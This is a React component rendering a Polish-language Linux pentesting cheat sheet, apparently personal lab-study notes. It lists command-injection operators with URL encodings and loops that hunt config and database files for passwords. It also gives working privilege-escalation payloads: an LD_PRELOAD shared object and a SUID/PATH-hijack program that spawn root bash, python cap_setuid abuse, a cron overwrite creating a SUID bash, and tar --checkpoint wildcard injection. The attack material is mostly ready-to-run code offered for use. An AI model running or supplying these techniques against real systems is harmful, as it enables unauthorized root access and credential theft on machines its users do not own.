import { Link } from 'react-router-dom';

const LinuxCommands = () => {

    return(
        <section>
            <h1>Linux Commands</h1>

            <table>
                <thead>
                    <tr>
                    <th>Wstrzyknięte znaki</th>
                    <th>Znak w URL-Encoded</th>
                    <th>Wykonanie polecenia</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    <td><code>;</code></td>
                    <td><code>%3b</code></td>
                    <td>Obydwa</td>
                    </tr>
                    <tr>
                    <td><code>\n</code></td>
                    <td><code>%0a</code></td>
                    <td>Obydwa</td>
                    </tr>
                    <tr>
                    <td><code>&amp;</code></td>
                    <td><code>%26</code></td>
                    <td>Obydwa (drugie wyjście jest zwykle pokazywane jako pierwsze)</td>
                    </tr>
                    <tr>
                    <td><code>|</code></td>
                    <td><code>%7c</code></td>
                    <td>Obydwa (pokazywane jest tylko drugie wyjście)</td>
                    </tr>
                    <tr>
                    <td><code>&amp;&amp;</code></td>
                    <td><code>%26%26</code></td>
                    <td>Obydwa (tylko jeśli pierwszy się powiedzie)</td>
                    </tr>
                    <tr>
                    <td><code>||</code></td>
                    <td><code>%7c%7c</code></td>
                    <td>Drugi (tylko jeśli pierwszy się nie powiedzie)</td>
                    </tr>
                    <tr>
                    <td><code>``</code></td>
                    <td><code>%60%60</code></td>
                    <td>Obydwa (tylko Linux)</td>
                    </tr>
                    <tr>
                    <td><code>$()</code></td>
                    <td><code>%24%28%29</code></td>
                    <td>Obydwa (tylko Linux)</td>
                    </tr>
                </tbody>
            </table>

            <div className='waring'>
                <p>Wskazówka: Oprócz powyższego istnieje kilka operatorów przeznaczonych tylko dla systemu Unix, które działają na Linuksie i macOS, ale nie działają na Windowsie, jak na przykład zawijanie naszego wstrzykniętego polecenia podwójnymi znakami wstecznymi (<span className='important'>``</span>) lub sub- operator powłoki (<span className='important'>$()</span>).</p>
            </div>

            <div className='waring'>
                <p>Uwaga: Jedynym wyjątkiem może być średnik ;, który nie będzie działać, jeśli polecenie zostało wykonane za pomocą wiersza poleceń systemu Windows (CMD), ale nadal będzie działać, jeśli zostanie wykonane za pomocą programu Windows PowerShell.</p>
            </div>

            <div className='waring'>
                <p><span className='important'>netstat -antp | grep -i list</span></p>
                <p>Lista otwartych lokalnie portów</p>
            </div>

            <hr />
            <h2>Credential Linux</h2>
            <div className='waring'>
                <p>for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "lib\|fonts\|share\|core" ;done</p>
                <p>for i in $(find / -name *.cnf 2{`>`}/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2{`>`}/dev/null | grep -v "\#";done</p>
                <p>for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "doc\|lib\|headers\|share\|man";done</p>
                <p>find /home/* -type f -name "*.txt" -o ! -name "*.*"</p>
                <p>for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2{`>`}/dev/null | grep -v "doc\|lib\|headers\|share";done</p>
                <p>for i in $(ls /var/log/* 2{`>`}/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2{`>`}/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2{`>`}/dev/null;fi;done</p>
            </div>
            <div className='waring'>
                <p>grep --color=auto -rnw '{`<Path>`}' -ie "{`<Looking for word>`}" --color=always 2{`>`}/dev/null</p>
            </div>

            <table>
                <thead>
                    <tr>
                    <th><strong>Komenda</strong></th>
                    <th><strong>Opis</strong></th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>&nbsp;<code>ps aux | grep root</code></td>
                        <td>Wyświetal procesy roota</td>
                    </tr>
                    <tr>
                    <td><code>history</code></td>
                    <td>Sprawdza hisorię bash usera</td>
                    </tr>
                    <tr>
                        <td><code>sudo -l</code></td>
                        <td>Czy użytkownik może uruchomić cokolwiek jako inny użytkownik?</td>
                    </tr>
                    <tr>
                    <td><code>ls -la /etc/cron.daily</code></td>
                    <td>Sprawdź codzienne zadania Cron</td>
                    </tr>
                    <tr>
                    <td><code>lsblk</code></td>
                    <td>Sprawdź, czy nie są zamontowane systems/drives</td>
                    </tr>
                    <tr>
                    <td><code>uname -a</code></td>
                    <td>Sprawdź wersję jądra (Kernel)</td>
                    </tr>
                    <tr>
                    <td><code>cat /etc/lsb-release </code></td>
                    <td>Sprawdź wersję systemu operacyjnego</td>
                    </tr>
                    <tr>
                    <td><code>screen -v</code></td>
                    <td>Sprawdź zainstalowaną wersję <code>Screen</code></td>
                    </tr>
                    <tr>
                    <td><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
                    <td>Znajdź pliki binarne z ustawionym bitem SUID</td>
                    </tr>
                    <tr>
                    <td><code>find / -user root -perm -6000 -exec ls -ldb {} \; 2&gt;/dev/null</code></td>
                    <td>Znajdź pliki binarne z ustawionym bitem SETGID</td>
                    </tr>
                    <tr>
                    <td>find / -group management -exec ls -l {} \; 2{`>`}/dev/null</td>
                    <td>Znajdź pliki dla grupy managment</td>
                    </tr>
                    <tr>
                    <td><code>echo $PATH</code></td>
                    <td>Sprawdź zawartość zmiennej PATH bieżącego użytkownika</td>
                    </tr>
                    <tr>
                    <td><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2&gt;/dev/null</code></td>
                    <td>Wyszukaj pliki konfiguracyjne (conf)</td>
                    </tr>
                    <tr>      
                    <td><code>showmount -e 10.129.2.12</code></td>
                    <td>Pokaż listę eksportu NFS</td>
                    </tr>
                    <tr>
                    <td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td>
                    <td>Zamontuj lokalnie udział NFS</td>
                    </tr>

                </tbody>
            </table>

            <details>
                <summary>LD_PRELOAD</summary>
                <div className='waring'>
                    <p>#include {`<stdio.h>`}</p>
                    <p>#include {`<sys/types.h>`}</p>
                    <p>#include {`<stdlib.h>`}</p>
                    <br />
                    <p>void _init(){`{`}</p>
                    <p className='tab-1'>unsetenv("LD_PRELOAD");</p>
                    <p className='tab-1'>setgid(0);</p>
                    <p className='tab-1'>setuid(0);</p>
                    <p className='tab-1'>system("/bin/bash");</p>
                    <p>{`}`}</p>
                </div>
                <p>gcc -fPIC -shared -o {`<Nazwa output>`} shell.c -nostartfiles</p>
                <p>sudo LD_PRELOAD={`<Pełna lokalizacja>`} {`<Jakiś servis z sudo -l>`}</p>
            </details>

            <details>
                <summary>.c escalation</summary>
                <div className='waring'>
                    <p>echo 'int main() {`{`} setgid(0); setuid(0); system("/bin/bash"); return 0;{`}`}'</p>
                </div>
                <p>gcc /tmp/service.c -o /tmp/service</p>
                <p>export PATH=/tmp:$PATH</p>
                <p>{'<Ścieżka pliku znalezionego przez -find / -type f -perm 04000 -ls 2>/dev/null >'}</p>
            </details>

            <details>
                <summary>getcap</summary>
                <p>getcap -r / 2{'>'}/dev/null</p>
                <div className='waring'>
                    <p>/usr/bin/python2.6 = cap_setuid+ep</p>
                    <p>...</p>
                </div>
                <p>/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'</p>
            </details>

            <details>
                <summary>cron</summary>
                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Nadpisujący się plik>'}</p>
                <p>chmod +x {'<Nadpisujący się plik>'}</p>
                <br />
                <p>Po zrobienu kopii</p>
                <p>/tmp/bash -p</p>
                <br />
                <p>----------</p>
                <br />
                <p>Gdy mamy skrypt który robi backup np. <span className='important'>tar czf /tmp/backup.tar.gz *</span></p>
                <p>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' {`>`} {'<Dowolna nazwa scriptu .sh>'}</p>
                <p>chmod +x {'<Utworzonego scriptu>'}</p>
                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint=1</p>
                <p>touch {`<Pełna ścieżka do forlderu wszystkich scriptów>`}/--checkpoint-action=exec=sh/{`<Utworzonego scriptu>`}</p>
                <br />
                <p>Czekamy aż cron wykona pliki</p>
                <p>/tmp/bash -p</p>
            </details>
        </section>
    )
};

export default LinuxCommands;